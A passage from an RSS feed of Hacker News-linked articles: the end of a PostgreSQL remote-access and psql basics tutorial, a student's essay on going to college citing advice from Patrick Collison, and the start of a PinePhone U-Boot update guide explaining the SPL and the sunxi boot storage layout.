postgres  <span>1981</span>  0.0  0.5 <span>286504</span>  <span>3028</span> ?        Ss   Jun28   0:00 postgres: checkpointer   
postgres  <span>1982</span>  0.0  0.2 <span>286388</span>  <span>1696</span> ?        Ss   Jun28   0:03 postgres: background writer   
postgres  <span>1983</span>  0.0  0.9 <span>286388</span>  <span>5676</span> ?        Ss   Jun28   0:03 postgres: walwriter   
postgres  <span>1984</span>  0.0  0.4 <span>286924</span>  <span>2688</span> ?        Ss   Jun28   0:02 postgres: autovacuum launcher  
</code></pre></div><p>Locate the file:</p>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ cd /postgresql/data/
<span>[</span>postgres@postgres-lab data<span>]</span>$ ls -lah postgresql.conf
-rw-------. <span>1</span> postgres postgres 26K Jun <span>28</span> 21:44 postgresql.conf
</code></pre></div><p>Change in <code>postgresql.conf</code> parameter <code>listen_addresses</code> to your server IP or <code>*</code> to listen on all IP’s available on server:</p>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab data<span>]</span>$ vi postgresql.conf

<span>##------------------------------------------------------------------------------</span>
<span>## CONNECTIONS AND AUTHENTICATION</span>
<span>##------------------------------------------------------------------------------</span>

<span>## - Connection Settings -</span>

listen_addresses <span>=</span> <span>'*'</span>          <span>## what IP address(es) to listen on;</span>
                                        <span>## comma-separated list of addresses;</span>
                                        <span>## defaults to 'localhost'; use '*' for all</span>
</code></pre></div><p>Restart PostgreSQL to apply changes - you can do that with <code>systemctl</code> from <code>root</code> os user  service or with <code>pg_ctl -D PGDATA restart</code> from <code>postgres</code> os user:</p>
<div><pre><code data-lang="bash"><span>[</span>root@postgres-lab ~<span>]</span><span>## systemctl restart postgresql-12.service</span>
</code></pre></div><p>Check whre PostgreSQL is listening now:</p>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ netstat -lptnu | grep post
<span>(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span>)</span>
tcp        <span>0</span>      <span>0</span> 0.0.0.0:5432            0.0.0.0:*               LISTEN      30161/postmaster    
tcp6       <span>0</span>      <span>0</span> :::5432                 :::*                    LISTEN      30161/postmaster  
</code></pre></div><h2 id="configure-remote-access---pg_hbaconf">Configure remote access - pg_hba.conf</h2>
<p>PostgreSQL instance has got restricted access by <code>pg_hba.conf</code> file(host based authentication file).</p>
<p>We can provide in it information from which <code>ADDRESS</code> to which <code>DATABASE</code> on which <code>USER</code> by what <code>METHOD</code> we allow connecting. Additionaly we have to provide <code>TYPE</code> of connection.</p>
<p>This file resides in same place where <code>postgresql.conf</code>(we can alter this behavior by setting <code>pg_hba</code> parameter in <code>postgresql.conf</code>):</p>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ cd /postgresql/data/

<span>[</span>postgres@postgres-lab data<span>]</span>$ vi pg_hba.conf
<span>## TYPE  DATABASE        USER            ADDRESS                 METHOD</span>

<span>## "local" is for Unix domain socket connections only</span>
local   all             all                                     trust
<span>## IPv4 local connections:</span>
host    all             all             127.0.0.1/32            trust
<span>## IPv6 local connections:</span>
host    all             all             ::1/128                 trust
</code></pre></div><p>Allowed <code>TYPE</code>'s:</p>
<ul>
<li><code>local</code> - socket connection - needed to connect from shell on database server</li>
<li><code>host</code> - standard TCP/IP connection over the network - bnost SSL and no SSL</li>
<li><code>hostssl</code> - TCP/IP connection but only with SSL</li>
<li><code>hostnossl</code> - TCP/IP only without SSL</li>
<li><code>hostgssenc</code> - TCP/IP only GSSAPI</li>
<li><code>hostnogssenc</code> - TCP/IP only without GSSAPI</li>
</ul>
<p>With <code>DATABASE</code> we can specify database name or use special value <code>sameuser</code> if database name should be same as name of user that is connecting.</p>
<p>With <code>USER</code> we can specify user or role - role name should be preceded by <code>+</code> sign.</p>
<p><code>ADDRESS</code> field could be - hostname, IP range in CIDR format or special words:</p>
<ul>
<li><code>samehost</code> - which correspond to all IP adresses of database server</li>
<li><code>samenet</code> - which correspond to all IP in database server subnet</li>
</ul>
<p>With <code>METHOD</code> field we can set one of authentication methods - most important ones are:</p>
<ul>
<li><code>trust</code> - allow connection without password - moslty set for local connections from database server itself</li>
<li><code>reject</code> - reject connections</li>
<li><code>md5</code> - allow connections after getting from user password - encrypted</li>
<li><code>password</code> - allow connection after getting plain password - DO NOT USE in untrusted networks - better -&gt; never use this option</li>
<li><code>ldap</code> - getting account authorization data from LDAP server</li>
</ul>
<p>In <code>DATABASE</code> and <code>USER</code> fields you can specify special word <code>all</code> if you don’t want to create any restrictions here.</p>
<p>There can be situation when we must use additional field named <code>auth-options</code> for specyfying details for example for <code>hostssl</code> connection type. This topic will be covered in another post.</p>
<h3 id="sample-pg_hba-record---allow-all-users-connect-to-any-db-from-all-ip-addresses---only-with-password">Sample pg_hba record - allow all users connect to any DB from all IP addresses - only with password</h3>
<p>Add in <code>pg_hba.conf</code>:</p>
<div><pre><code data-lang="bash"><span>## Network access</span>
host    all             all             0.0.0.0/0               md5
</code></pre></div><p>Reload(online operation) PostgreSQL that it can use <code>pg_hba.conf</code> changes:</p>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab data<span>]</span>$ /usr/pgsql-12/bin/pg_ctl -D /postgresql/data reload
server signaled
</code></pre></div><h2 id="connecting-to-postgresql">Connecting to PostgreSQL</h2>
<h3 id="local-from-server">Local from server</h3>
<p>It will work without password because we have <code>trust</code> in <code>pg_hba.conf</code> for <code>local</code> connections:</p>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ psql
psql <span>(</span>12.3<span>)</span>
Type <span>"help"</span> <span>for</span> help.
</code></pre></div><h3 id="remote-machine">Remote machine</h3>
<p>Default URI syntax - you can connect like this:<br>
<code>psql postgresql://user:passwd@host:5432/dbame</code><br>
or by more common method:<br>
Connect to remote database from <code>psql</code> with connections details provided in parameters(it will ask for password because of <code>md5</code> method in <code>pg_hba.conf</code> for connections from <code>0.0.0.0/0</code>):</p>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab data<span>]</span>$ psql -h 10.128.0.2 -p <span>5432</span>
Password <span>for</span> user postgres:
psql <span>(</span>12.3<span>)</span>
Type <span>"help"</span> <span>for</span> help.

postgres<span>=</span><span>##</span>
</code></pre></div><p>We can also use parameter <code>-U</code> to specify username different than OS username we currently are using.</p>
<p>Also all this parameters can be taken from shell variables which names are self descriptive - if we set all of them we can just use plain <code>psql</code> command to connect:</p>
<ul>
<li><code>PGHOST</code></li>
<li><code>PGPORT</code></li>
<li><code>PGDATABASE</code></li>
<li><code>PGUSER</code></li>
<li><code>PGPASSWORD</code></li>
</ul>
<h3 id="check-connected-database">Check connected database</h3>
<div><pre><code data-lang="bash">postgres<span>=</span><span>## select current_database();</span>
 current_database
------------------
 postgres
<span>(</span><span>1</span> row<span>)</span>
</code></pre></div><h3 id="check-current-user">Check current user</h3>
<div><pre><code data-lang="bash">postgres<span>=</span><span>## select current_user;</span>
 current_user
--------------
 postgres
<span>(</span><span>1</span> row<span>)</span>
</code></pre></div><h3 id="check-ip-and-port-used-for-connection">Check IP and port used for connection</h3>
<div><pre><code data-lang="bash">postgres<span>=</span><span>## select inet_server_addr(), inet_server_port();</span>
 inet_server_addr | inet_server_port
------------------+------------------
 10.128.0.2       |             <span>5432</span>
<span>(</span><span>1</span> row<span>)</span>
</code></pre></div><h3 id="check-postgresql-version">Check PostgreSQL version</h3>
<div><pre><code data-lang="bash">postgres<span>=</span><span>## select version();</span>
                                                version                                                 
--------------------------------------------------------------------------------------------------------
 PostgreSQL 12.3 on x86_64-pc-linux-gnu, compiled by gcc <span>(</span>GCC<span>)</span> 8.3.1 <span>20191121</span> <span>(</span>Red Hat 8.3.1-5<span>)</span>, 64-bit
<span>(</span><span>1</span> row<span>)</span>
</code></pre></div><h3 id="check-connection-info">Check connection info</h3>
<div><pre><code data-lang="bash">postgres<span>=</span><span>## \conninfo</span>
You are connected to database <span>"postgres"</span> as user <span>"postgres"</span> on host <span>"10.128.0.2"</span> at port <span>"5432"</span>.
</code></pre></div><h2 id="executing-commands-from-shell">Executing commands from shell</h2>
<h3 id="execute-single-command-from-shell">Execute single command from shell</h3>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ psql -c <span>"select current_time"</span>
    current_time    
--------------------
 14:09:19.854598+00
<span>(</span><span>1</span> row<span>)</span>
</code></pre></div><h3 id="exacute-sql-script-from-shell">Exacute sql script from shell</h3>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ psql -f create_user.sql
CREATE ROLE
CREATE ROLE
CREATE ROLE
</code></pre></div><h3 id="combine-single-command-with-sql-script-from-shell">Combine single command with sql script from shell</h3>
<div><pre><code data-lang="bash"><span>[</span>postgres@postgres-lab ~<span>]</span>$ psql -c <span>"select current_time"</span> -f create_user.sql -c <span>"select current_time"</span>
    current_time    
--------------------
 14:14:26.922453+00
<span>(</span><span>1</span> row<span>)</span>

CREATE ROLE
CREATE ROLE
CREATE ROLE
    current_time    
--------------------
 14:14:26.926545+00
<span>(</span><span>1</span> row<span>)</span>
</code></pre></div>
<h3 id="check-all-available-metacommands">Check all available metacommands</h3>
<p>Do it yourself to see all available commands - output trimmed to important ones!</p>
<div><pre><code data-lang="bash">postgres<span>=</span><span>## \?</span>
General
  <span>\c</span>opyright             show PostgreSQL usage and distribution terms
  <span>\c</span>rosstabview <span>[</span>COLUMNS<span>]</span> execute query and display results in crosstab
  <span>\e</span>rrverbose            show most recent error message at maximum verbosity
  <span>\g</span> <span>[</span>FILE<span>]</span> or ;         execute query <span>(</span>and send results to file or |pipe<span>)</span>
  <span>\g</span>desc                 describe result of query, without executing it
  <span>\g</span>exec                 execute query, <span>then</span> execute each value in its result
  <span>\g</span>set <span>[</span>PREFIX<span>]</span>         execute query and store results in psql variables
  <span>\g</span>x <span>[</span>FILE<span>]</span>             as <span>\g</span>, but forces expanded output mode
  <span>\q</span>                     quit psql
  <span>\w</span>atch <span>[</span>SEC<span>]</span>           execute query every SEC seconds

  Query Buffer
    <span>\e</span> <span>[</span>FILE<span>]</span> <span>[</span>LINE<span>]</span>       edit the query buffer <span>(</span>or file<span>)</span> with external editor
    <span>\e</span>f <span>[</span>FUNCNAME <span>[</span>LINE<span>]</span><span>]</span>  edit <span>function</span> definition with external editor
    <span>\e</span>v <span>[</span>VIEWNAME <span>[</span>LINE<span>]</span><span>]</span>  edit view definition with external editor
    <span>\p</span>                     show the contents of the query buffer
    <span>\r</span>                     reset <span>(</span>clear<span>)</span> the query buffer
    <span>\s</span> <span>[</span>FILE<span>]</span>              display history or save it to file
    <span>\w</span> FILE                write query buffer to file

</code></pre></div><h3 id="list-objects-in-psql">List objects in psql</h3>
<ul>
<li>\d[S+]          -       list tables, views, and sequences</li>
<li>\d[S+]  NAME     -      describe table, view, sequence, or index</li>
<li>\da[S]  [PATTERN] -     list aggregates</li>
<li>\dA[+]  [PATTERN]  -    list access methods</li>
<li>\db[+]  [PATTERN]   -   list tablespaces</li>
<li>\dc[S+] [PATTERN]    -  list conversions</li>
<li>\dC[+]  [PATTERN]     - list casts</li>
<li>\dd[S]  [PATTERN]     - show object descriptions not displayed elsewhere</li>
<li>\dD[S+] [PATTERN]     - list domains</li>
<li>\ddp    [PATTERN]     - list default privileges</li>
<li>\dE[S+] [PATTERN]     - list foreign tables</li>
<li>\det[+] [PATTERN]     - list …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://knowledgepill.it/posts///postgresql-basics-guide/">https://knowledgepill.it/posts///postgresql-basics-guide/</a></em></p>]]>
            </description>
            <link>https://knowledgepill.it/posts///postgresql-basics-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24244514</guid>
            <pubDate>Sat, 22 Aug 2020 14:52:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Patrick Collison Told Me About Going to College]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24244425">thread link</a>) | @jdcampolargo
<br/>
August 22, 2020 | https://www.juandavidcampolargo.com/blog/college | <a href="https://web.archive.org/web/*/https://www.juandavidcampolargo.com/blog/college">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-37b97e2792cec9751559"><div><p><em>Before we start I want to note that these are my thoughts and what I think is right. I may be wrong and if I am I’d love for</em><a href="https://www.juandavidcampolargo.com/contact" target="_blank"> you to prove me wrong.&nbsp;</a></p><p>Lots of smart people have written about why you shouldn't go to college. But I'm giving it a shot.</p><p>Yeah, you read that right. I’m going to college despite the argument of many people of why people shouldn’t go to college.&nbsp;</p><p>I want to study engineering because I want to get the foundation of specialization in a method of thinking. I want to have one strong foundational skill that I can build on.</p><p>Many say college isn't worth it. And I want to add perspective to this debate as an entrepreneur, immigrant, and optimist.&nbsp;</p><p>Richard Hamming said once, “If you do not work on an important problem, it’s unlikely you’ll do important work.” Hamming gave a talk titled You and Your Research, which has made me think about my decisions and future projects, especially for solving <strong>important problems.&nbsp;</strong></p><p>The most important problems will require a more technical background and solid foundation where a combination of inspiration and a strong foundation will be key.&nbsp;</p><p>I asked Patrick Collision, one of the youngest billionaires and founders of Stripe, about what he thought about college. He said that teenagers like me (17) should keep learning for about 5 or 7 years before they commit to a plan of action of starting a venture. Learning does not mean college, it means going in-depth in your field of study to see the opportunities only an expert would identify.&nbsp;</p><p>I fell into the trap of starting and committing to ideas too early when I didn’t have the foundations. For instance, I wanted to create an app to translate Google Docs into other formats across the web. I needed to learn like 4 programming languages, API, authentication, and the list goes on. That just wasn’t viable, not impossible. I still want to do it and I’m learning to make it happen, but it’s an example of how you can fall into that trap.&nbsp; <strong>Exactly what Collison said </strong>about starting too early.</p><p>Hold on a second.<br></p><p>Why would Patrick say this? Didn’t he drop out of college not once, but twice? I couldn’t resist challenging him and asked, Don’t you see the contradiction here, why would he advise us the opposite of what he did?&nbsp;</p><p>He laughed and said that in certain fields the knowledge required is deeper, more specialized, and needs more study time and commitment. The learning curve is just too steep. He said we should be wary of starting too early, depending on the type of innovation we want to get involved in.&nbsp;</p><p>He also said that software forgives youngsters as you can get good at it by working and creating apps, websites, or programs. Patrick gave the example of how if he wanted to start a biotech company, he really couldn’t because of how much he’d need to learn.&nbsp;</p><p>Patrick makes a good point. But he forgot to say something he did. The two times he went to college, he was always working on projects. For me, going to college means I will learn and work on projects.&nbsp;</p><p>I will learn and create things. Hopefully, these ventures don’t take off because I won’t think twice [1].&nbsp; I shouldn’t try to choose between college &amp; working on projects but choose both. College and my projects should be related, and I should use college to leverage my projects and endeavors.&nbsp;</p><p>In college I plan on creating startups, working with professors on research, commercializing findings, creating patents, products, and anything that comes my way. The opportunities are limitless and I plan to find and take advantage of the opportunities that I can <strong>only find at college </strong>[2]<strong>.&nbsp;</strong></p><p>A big motivation for people going to college is “networking.” Is meeting people important? Sure yeah, but do you remember the time we’re living? We can meet anyone by clicking a button.&nbsp;</p><p>The networking thing isn’t solid enough and lacks independent thinking. <strong>Hello? </strong>We have LinkedIn and Twitter and whatever else. Others say they found valuable friendships and learned how to socialize with others. Sure? I don’t even know what to say about this. Perhaps it’s because I read <em>How to Win Friends and Influence People.</em> Just kidding (mostly).</p><p>College networking is more transformational than just meeting people. The connection is far different when you work and live with these people for four years, especially because of the intimate and emotional experiences with them. The emergencies, all-nighters to study for exams, parties, volunteering, heartbreaks, etc. They don’t happen online. They only happen in person, and usually in college.&nbsp;</p><p>You can be holed up working on projects and hustling, you can party and not care about grades, or you can have the best of both worlds.</p><p>There are other places where you can find these opportunities to meet people and learn how to talk to people such as working on a job, starting a company, going to events, and putting yourself out there. Sure, but not in a collegiate environment [3].</p><h2>The Engineer Entrepreneur&nbsp;</h2><p>Look, I’m going to college to learn something hard such as engineering and science. Something I can mostly only do there.&nbsp;</p><p>If I study engineering, I could come back and learn pretty much anything else. If I study soft sciences, I can’t really come back and study engineering. I also know that the best way to really learn engineering is to engineer stuff via building, and not necessarily in college.&nbsp;</p><p>I’m aware I may not like engineering, or perhaps I will change to study something else. We’ll see. I’m probably not going to be the “best engineer.” And that is OK! I probably don’t want to be the best engineer, it’s too hard and too risky. I intend to become a “<a href="https://pmarchive.com/guide_to_career_planning_part2.html#:~:text=Seek%20to%20be%20a%20double%2Ftriple%2Fquadruple%20threat." target="_blank">double, triple, or quadruple threat</a>.”&nbsp;</p><p>Scott Adams says there are mostly two paths to a remarkable life. He advises:</p><blockquote><p>If you want an average successful life, it doesn’t take much planning. Just stay out of trouble, go to school, and apply for jobs you might like. But if you want something extraordinary, you have two paths:</p><p>1. Become the best at one specific thing.</p><p>2. Become very good (top 25%) at two or more things.</p></blockquote><p>That’s what I intend to do.&nbsp; A good example of complementing skills is Patrick Collison who combines coding, leadership, and business. He’s a great coder but probably not the best in the world. The same with leadership and business. When you combine these skills that are rarely found together, you get someone like Patrick Collison.&nbsp;</p><p>I already have the entrepreneurial mindset for ideas and adaptability.&nbsp;</p><p>I've been a person who started businesses and selling things since I was a little kid. I’d sell <a href="https://collectibles.paniniamerica.net/store/col_usa_en" target="_blank">Panini World Cup</a> stickers at school to my friends. Sometimes I wouldn’t even finish my album because I’d sold so many of the stickers. I’d sell cheese to companies, friends, my mom’s clients, anywhere, or anyone. That's how I was.&nbsp;</p><p>I was an entrepreneur before the word entrepreneur became buzzy. I didn’t even know the word because I knew no English.&nbsp;</p><p>Then, when I moved to the U.S. at 13, I started more companies, including a digital marketing agency. I was always doing. I was always learning (<a href="http://juandavidcampolargo.com/blog/highschool" target="_blank">Read my Journey through High School</a>).</p><p>Some skills I’m improving are public speaking, writing, speaking different languages, finance and economics, big picture-oriented, international leadership, and boldness.&nbsp;</p><p>I’m more like Andrew Carnegie and Cyrus McCormick category who commercialize and innovate with technology, and not necessarily invent the technologies. Although I want to be more of an entrepreneur than a technologist, it will be extremely useful to get a solid background and put the effort to do so.&nbsp;</p><p>In the era of <a href="https://www.juandavidcampolargo.com/blog/leverage" target="_blank">leverage</a>, we don’t need credentials, money, or distribution. As long as you solve a problem people care about, you can get started at any age, come from any field or country, need little or no money. Just start and use free distribution channels like social media to reach people.&nbsp;</p><p>A <a href="https://www.adamtank.com/" target="_blank">friend</a> pointed out an interesting point. He said that you don't need a degree (including engineering) to change how society functions or build something yourself. But you do need a degree if you want to work within what society has built, because the structure requires it.<br></p><p><strong>I want to work within what society has built to positively change how society functions.&nbsp;</strong></p><p>Engineering and science are fascinating and being able to use them to create and build things is my <strong>dream. </strong>Not only build but also research. I look up to people like Pasteur who engaged in research and engineering inventions. I’m as passionate for fundamental science questions as I am for innovating with technology.&nbsp;</p><h2>Should <strong>You </strong>Go to college? Think For Yourself.&nbsp;</h2><p>I’m going to college in a weird, transitory time. Perhaps students in 5-10 years won’t have to go to college because someone made a better system. Who knows?</p><p>Or maybe people will skip college and go to graduate school. I don’t know. I don’t have the answer.</p><p>But what I do have is <strong>my</strong> <strong>answer</strong>. Going to college is a personal question related to your goals and ambitions. Ask yourself, What the hell do I want to do? If you don’t know, ask people who know you (parents, family, friends, etc) to tell you what you’re good at or what they see you doing in 10 years.&nbsp;</p><p>They know you. That doesn’t mean they’re always right, but they can give you a valuable hint where to look and go.&nbsp;</p><p>Once you have something that you want to do (or at least some idea), see and think for yourself whether going to college makes sense.&nbsp;</p><p>If you want to do business, going to college isn’t as valuable as starting a company, and so on.&nbsp;</p><p>And again, going to college to meet people and network isn’t convincing as you can meet exceptional people on the internet. I don’t buy it. However, you could make a different type of relationship, usually more meaningful.</p><p>Most important of all, think from <a href="https://jamesclear.com/first-principles" target="_blank">first principles</a> and think for yourself.&nbsp;</p><p>What does that mean?&nbsp;</p><p>Ignore the mainstream, especially those who have not accomplished the goals you want to accomplish. If you want to become a doctor, why would you listen to an entrepreneur? If you want to become an entrepreneur, why would you listen to a lawyer? If you want …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.juandavidcampolargo.com/blog/college">https://www.juandavidcampolargo.com/blog/college</a></em></p>]]>
            </description>
            <link>https://www.juandavidcampolargo.com/blog/college</link>
            <guid isPermaLink="false">hacker-news-small-sites-24244425</guid>
            <pubDate>Sat, 22 Aug 2020 14:38:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to update U-Boot for PostmarketOS on the Pine Phone]]>
            </title>
            <description>
<![CDATA[
Score 71 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24244407">thread link</a>) | @dustfinger
<br/>
August 22, 2020 | https://bloggerbust.ca/post/how-to-update-uboot-for-postmarketos-on-the-pinephone/ | <a href="https://web.archive.org/web/*/https://bloggerbust.ca/post/how-to-update-uboot-for-postmarketos-on-the-pinephone/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 


<!--endtoc-->

<h2 id="introduction">Introduction</h2>

<p>If you are in a hurry to update U-Boot and the SPL on your PinePhone, then please proceed directly to <a href="#write-u-boot-plus-spl-to-bootable-storage">Write U-Boot+SPL to bootable storage</a>.</p>

<p>In this article, I am going to explain what U-Boot, SoC and the SPL are. After that, I will describe the sunxi bootable storage layout as well as the PinePhone boot procedure, so you will understand what you will be updating and why. Then, I will teach you how to determine if an upgrade is required, and I will explain two different ways of upgrading U-Boot. As a special treat for the curious, I will show you the first steps to reverse engineer the U-Boot+SPL firmware blob. I hope this article peeks your curiosity and encourages you to learn more.</p>

<p>Discussed on <a href="https://news.ycombinator.com/item?id=24244407">Hacker News</a> and <a href="https://forum.pine64.org/showthread.php?tid=11099">Pine64</a>.</p>

<h2 id="what-is-u-boot">What is U-Boot?</h2>

<p>U-Boot, or rather <a href="https://en.wikipedia.org/wiki/Das%5FU-Boot">Das U-Boot</a> a.k.a <em>the Universal Boot Loader</em>, is a small program that is loaded into <em>read-only memory</em> (ROM) and is ultimately responsible for loading the Linux kernel. Designed with flexibility in mind, U-Boot now supports <a href="https://gitlab.denx.de/u-boot/u-boot/-/tree/master/arch">a wide variety of architectures</a> for <a href="https://gitlab.denx.de/u-boot/u-boot/-/tree/master/board">embedded boards</a>, each of which may support multiple boot methods. This article is only concerned with U-Boot as it is configured for the <a href="https://gitlab.denx.de/u-boot/u-boot/-/blob/master/board/sunxi/README.sunxi64">Allwinner 64-bit boards</a>, specifically the <a href="https://linux-sunxi.org/A64">Allwinner A64 SoC</a>.</p>

<h2 id="what-is-a-soc">What is a SoC?</h2>

<p>No, it does not refer to the stinky fabric covering your feet. <em>SoC</em> stands for <em>System on a Chip</em>. The PinePhone contains the <a href="https://linux-sunxi.org/A64">Allwinner A64 SoC</a>, featuring a Quad-Core <a href="https://en.wikipedia.org/wiki/ARM%5FCortex-A53">ARM Cortex-A53 ARMv8-A CPU</a> and an <a href="https://linux-sunxi.org/Mali400">ARM Mali400 MP2 GPU</a>. See the <a href="https://linux-sunxi.org/A64#Documentation">Allwinner A64 documentation</a> for more details.</p>

<h2 id="what-is-the-spl">What is the SPL?</h2>

<p>The <em>Secondary Program Loader’s</em> (SPL) primary function is to load U-Boot proper, the <em>flattened device tree</em> (<a href="https://devicetree-specification.readthedocs.io/en/latest/flattened-format.html">FDT</a>) and the <em>Arm Trusted Firmware</em> (<a href="https://www.trustedfirmware.org/about/">ATF</a>), ultimately passing execution to the ATF. In particular, execution is passed to <em>Trusted Firmware-A</em> (<a href="https://trustedfirmware-a.readthedocs.io/en/latest/index.html">TF-A</a>), which is <a href="https://github.com/ARM-software/arm-trusted-firmware">the official reference implementation</a> used by SoCs with armv8- cores, such as <a href="https://trustedfirmware-a.readthedocs.io/en/latest/plat/allwinner.html">Allwinner Armv8-A SoCs</a>.</p>

<h2 id="what-installs-the-spl">What installs the SPL?</h2>

<p>The SPL is installed via the <code>u-boot-pinephone</code> package from the <a href="http://postmarketos1.brixit.nl/postmarketos/master/aarch64/">postmarketOS aarch64 APK repository</a>. The package is built from the <a href="https://gitlab.com/pine64-org/u-boot/">pine64 u-boot fork</a> in which they added a <a href="https://gitlab.com/pine64-org/u-boot/-/blob/master/.gitlab-ci-pine64.yml">pine64 specific GitLab CI/CD pipeline configuration</a>. By listing the contents of the package using the <a href="https://wiki.alpinelinux.org/wiki/Alpine%5FLinux%5Fpackage%5Fmanagement#apk%5Finfo">apk info</a> command we can see where the SPL binary is actually installed to the root file system.</p>
<div><pre><code data-lang="sh">second-chance:~$ apk info -L u-boot-pinephone</code></pre></div><div><pre><code data-lang="text">u-boot-pinephone-2020.04_git20200421-r1 contains:
usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin</code></pre></div>
<p>However, this is just a convenient location to deliver the binary. The SPL must be deployed to a specific location on disk so that the BootROM can load it.</p>

<h2 id="a-bit-about-bytes">A bit about bytes</h2>

<p>I suspect that not all of those reading this article are familiar with the various standards when it comes to measuring information. Allow me to digress with a brief introduction to these standards with respect to how they both measure and represent a <em>kilobyte</em>. Many of the articles that I have linked herein use the <em><a href="https://en.wikipedia.org/wiki/JEDEC%5Fmemory%5Fstandards#Unit%5Fprefixes%5Ffor%5Fsemiconductor%5Fstorage%5Fcapacity">Joint Electron Device Engineering Council</a></em> (JEDEC) memory standards in which the unit for <em>kilobyte</em> is denoted by (<code>KB</code>), in upper case letters and represents <code>1024B</code>. This is not to be confused with the kilobyte from the <em><a href="https://en.wikipedia.org/wiki/Metric%5Fprefix/">International System of Quantities</a></em> (SI) in which <em>kilo</em> is denoted with a lower case <code>k</code>, such that <code>kB</code> means <code>1000B</code>. My preference is to use the <a href="https://en.wikipedia.org/wiki/Kibibyte">kibibyte</a> (pron. KI-BEE-BYTE), which was established by the <em><a href="https://en.wikipedia.org/wiki/International%5FElectrotechnical%5FCommission">International Electrotechnical commission</a></em> (IEC) and is recognized by all major standards organizations, including those aforementioned.</p>

<table>
<thead>
<tr>
<th>Decimal</th>
<th></th>
<th>Binary</th>
<th></th>
<th></th>
</tr>
</thead>

<tbody>
<tr>
<td>Value</td>
<td>Metric</td>
<td>Value</td>
<td>IEC</td>
<td>JEDEC</td>
</tr>

<tr>
<td>1</td>
<td>B byte</td>
<td>1</td>
<td>B byte</td>
<td>B byte</td>
</tr>

<tr>
<td>1000</td>
<td>kB kilobyte</td>
<td>1024</td>
<td>KiB kibibyte</td>
<td>KB kilobyte</td>
</tr>

<tr>
<td>1000^2</td>
<td>MB megabyte</td>
<td>1024^2</td>
<td>MiB mebibyte</td>
<td>MB megabyte</td>
</tr>

<tr>
<td>1000^3</td>
<td>GB gigabyte</td>
<td>1024^3</td>
<td>GiB gibibyte</td>
<td>GB gigabyte</td>
</tr>

<tr>
<td>1000^4</td>
<td>TB terabyte</td>
<td>1024^4</td>
<td>TiB tebibyte</td>
<td>-</td>
</tr>
</tbody>
</table>

<p>The reasoning behind my preference is two fold:</p>

<ol>
<li>The JEDEC <a href="https://www.jedec.org/document%5Fsearch?search%5Fapi%5Fviews%5Ffulltext=JESD100B01">Terms, Definitions, and Letter Symbols for Microcomputers, Microprocessors, and Memory Integrated Circuits</a> only defines the first three higher order prefixes: <em>kilo</em> (K), <em>mega</em> (M), <em>giga</em> (G), referring to them for common usage. The prefix <em>tera</em> was later added to the JEDEC terms dictionary to reflect <a href="https://www.jedec.org/standards-documents/dictionary/terms/mega-m-prefix-units-semiconductor-storage-capacity">common prefix usage for modern semiconductor storage capacity</a>.</li>
<li>IEC prefixes cannot be confused with Metric prefixes.</li>
</ol>

<p>To make matters more confusing, sometimes lowercase <code>k</code> is used to mean 1024, e.g. see <a href="https://man7.org/linux/man-pages/man1/tar.1.html#OPTIONS">tar(1) OPTIONS</a> sub section <code>Size Suffixes</code> located <a href="https://man7.org/linux/man-pages/man1/tar.1.html#RETURN%5FVALUE">above the RETURN VALUE section</a>. Understanding which system of measurement is being used is essential when calculating offsets.</p>

<h2 id="layout-of-sunxi-bootable-storage">Layout of sunxi bootable storage</h2>

<p>The first 40 plus <code>KiB</code> of bootable storage for an Allwinner based board has the <a href="https://linux-sunxi.org/Bootable%5FSD%5Fcard#SD%5FCard%5FLayout">following default layout</a>:</p>

<table>
<thead>
<tr>
<th>Start</th>
<th>Size</th>
<th>Usage</th>
</tr>
</thead>

<tbody>
<tr>
<td>0KiB</td>
<td>8KiB</td>
<td>Reserved for optional MBR or GPT</td>
</tr>

<tr>
<td>8KiB</td>
<td>32KiB</td>
<td>Initial SPL</td>
</tr>

<tr>
<td>40KiB</td>
<td>-</td>
<td>U-Boot Proper</td>
</tr>
</tbody>
</table>

<p>From the layout, one can conclude that upgrading the SPL and U-Boot for the PinePhone must involve writing the <code>u-boot-sunxi-with-spl.bin</code> to bootable storage starting at <code>8192B</code>.</p>

<h2 id="pinephone-boot-procedure">PinePhone boot procedure</h2>

